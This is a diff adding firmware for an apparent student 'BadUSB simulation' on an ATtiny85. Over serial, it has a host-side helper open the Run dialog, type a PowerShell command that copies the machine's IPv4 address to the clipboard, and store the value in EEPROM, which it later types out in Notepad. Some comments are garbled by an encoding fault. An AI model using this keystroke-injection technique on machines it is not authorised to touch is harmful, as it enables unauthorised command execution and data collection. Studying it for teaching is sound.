@@ -1,0 +1,162 @@
+/*******************************************************
+Project : BadUSB Simulation - Project 3 Final
+Chip    : ATtiny85
+Clock   : 8.000000 MHz
+Baud    : 4800 (Software UART)
+*******************************************************/
+
+#include <tiny85.h>
+#include <delay.h>
+#include <stdio.h>
+
+#define TX_PIN PORTB.0
+#define TX_DDR DDRB.0
+#define RX_PIN PINB.1
+#define RX_DDR DDRB.1
+#define BTN_PIN PINB.4
+#define BTN_DDR DDRB.4
+#define BTN_PORT PORTB.4
+
+#define BIT_DELAY_US 208
+#define HALF_BIT_DELAY_US 104
+
+#define EEPROM_START_ADDR 0x00
+
+void uart_tx(char data) {
+    unsigned char i;
+    TX_PIN = 0; delay_us(BIT_DELAY_US); // Start Bit
+    for (i = 0; i < 8; i++) {
+        if (data & 1) TX_PIN = 1; else TX_PIN = 0;
+        data >>= 1; delay_us(BIT_DELAY_US);
+    }
+    TX_PIN = 1; delay_us(BIT_DELAY_US); // Stop Bit
+}
+
+void uart_print_flash(flash char *str) {
+    while (*str) uart_tx(*str++);
+}
+
+void uart_print_ram(char *str) {
+    while (*str) uart_tx(*str++);
+}
+
+char uart_rx(void) {
+    unsigned char i;
+    char data = 0;
+    while (RX_PIN == 1); 
+    delay_us(HALF_BIT_DELAY_US);
+    if (RX_PIN == 1) return 0; // ÎØÇí äæíÒ
+    delay_us(BIT_DELAY_US);
+    
+    for (i = 0; i < 8; i++) {
+        data >>= 1;
+        if (RX_PIN == 1) data |= 0x80;
+        delay_us(BIT_DELAY_US);
+    }
+    delay_us(BIT_DELAY_US); // Stop bit pass
+    return data;
+}
+
+void EEPROM_write(unsigned int uiAddress, unsigned char ucData) {
+    while(EECR & (1<<EEPE)); 
+    EECR = (0<<EEPM1)|(0<<EEPM0);
+    EEAR = uiAddress;
+    EEDR = ucData;
+    EECR |= (1<<EEMPE);
+    EECR |= (1<<EEPE);
+}
+
+unsigned char EEPROM_read(unsigned int uiAddress) {
+    while(EECR & (1<<EEPE)); // ÕÈÑ ÈÑÇí ÇÊãÇã äæÔÊä ÞÈáí
+    EEAR = uiAddress;
+    EECR |= (1<<EERE);
+    return EEDR;
+}
+
+void save_ip_to_eeprom(char *str) {
+    int i = 0;
+    while(str[i] != 0 && i < 16) {
+        EEPROM_write(EEPROM_START_ADDR + i, str[i]);
+        i++;
+    }
+    EEPROM_write(EEPROM_START_ADDR + i, 0);
+}
+
+void read_ip_from_eeprom(char *buffer) {
+    int i = 0;
+    unsigned char c;
+    do {
+        c = EEPROM_read(EEPROM_START_ADDR + i);
+        buffer[i] = c;
+        i++;
+    } while (c != 0 && i < 16);
+}
+
+flash char CMD_RUN[] = "CMD:RUN\n";
+flash char KEY_ENTER[] = "KEY:ENTER\n";
+
+void main(void) {
+    char data_buffer[20]; 
+    int i;
+
+    TX_DDR = 1; TX_PIN = 1; 
+    RX_DDR = 0;            
+    BTN_DDR = 0; BTN_PORT = 1; 
+
+    delay_ms(1000);
+    uart_print_flash("DEBUG: *** SYSTEM START ***\n");
+    
+    if (BTN_PIN == 0) { 
+        uart_print_flash("DEBUG: MODE -> PLAYBACK (Button Held)\n");
+        delay_ms(1000); 
+        read_ip_from_eeprom(data_buffer);
+        if (data_buffer[0] == 0xFF || data_buffer[0] == 0) {
+            uart_print_flash("DEBUG: EEPROM Empty! Run Attack Mode first.\n");
+        } else {
+            uart_print_flash("DEBUG: Data found in EEPROM. Typing...\n");
+            
+            uart_print_flash(CMD_RUN); delay_ms(500);
+            uart_print_flash("TYPE:notepad\n"); delay_ms(500);
+            uart_print_flash(KEY_ENTER); delay_ms(1500);
+
+            uart_print_flash("TYPE:TARGET IP: "); 
+            uart_print_flash("\n"); 
+            
+            delay_ms(800); 
+            uart_print_flash("TYPE:");
+            uart_print_ram(data_buffer); 
+            uart_print_flash("\n");
+            
+            uart_print_flash("DEBUG: Typing Complete.\n");
+        }
+        
+        while(1); 
+
+    } else {
+        uart_print_flash("DEBUG: MODE -> ATTACK (Extraction)\n");
+
+        uart_print_flash(CMD_RUN); delay_ms(500);
+        
+        uart_print_flash("TYPE:powershell \"Set-Clipboard -Value (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]\"\n");
+        delay_ms(500);
+        
+        uart_print_flash(KEY_ENTER);
+        delay_ms(4000); 
+        uart_print_flash("ACTION:GET_CLIP\n");
+
+        for(i=0; i<15; i++) {
+            char c = uart_rx();
+            if(c == '\n' || c == '\r' || c == 0) {
+                data_buffer[i] = 0;
+                break;
+            }
+            data_buffer[i] = c;
+        }
+        data_buffer[15] = 0; 
+        save_ip_to_eeprom(data_buffer);
+        uart_print_flash("DEBUG: IP Saved to EEPROM successfully.\n");
+        uart_print_flash("DEBUG: Please Unplug and Re-plug with Button HELD.\n");
+
+        while(1); 
+    }
+}
